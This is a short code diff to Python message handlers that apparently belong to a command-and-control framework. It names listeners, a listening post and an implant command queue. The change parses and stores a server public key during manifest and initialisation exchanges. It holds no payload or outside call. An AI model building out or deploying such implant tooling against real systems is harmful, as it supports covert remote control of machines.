@@ -1,4 +1,5 @@
 from lib import instructions
+from lib.crypto import asymmetric
 
 
 def send_manifest(frame, listener):
@@ -11,6 +12,7 @@ def send_manifest(frame, listener):
     :param listener:
     :return:
     """
+    listener.ts_pubkey = asymmetric.public_key_from_bytes(str(frame['args'][0]['tpk']))
     # TODO: HIGH_PRI: Make a listener.manifest
     data = {'component_id': listener.component_id, "cmd": "lpm", "args": [listener.manifest, {"lpk": listener.initial_public_key._public_key}],
             "txid": frame['txid']}
@@ -43,6 +45,7 @@ def rekey(frame, listener):
 
 def initialized(frame, listener):
     reply_frame = None
+    listener.ts_pubkey = asymmetric.public_key_from_bytes(str(frame['args'][0]['tpk']))
     listener.listening_post.status = "READY"
     return reply_frame
 
@@ -60,6 +63,7 @@ def request_command(listener):
     instruction_frame = instructions.create_instruction_frame(data)
     reply_frame = instruction_frame  # Debug, will be encoded once cooked
     return reply_frame
+
 
 def receive_command(frame, listener):
     # TODO: add the command to the implant's queue
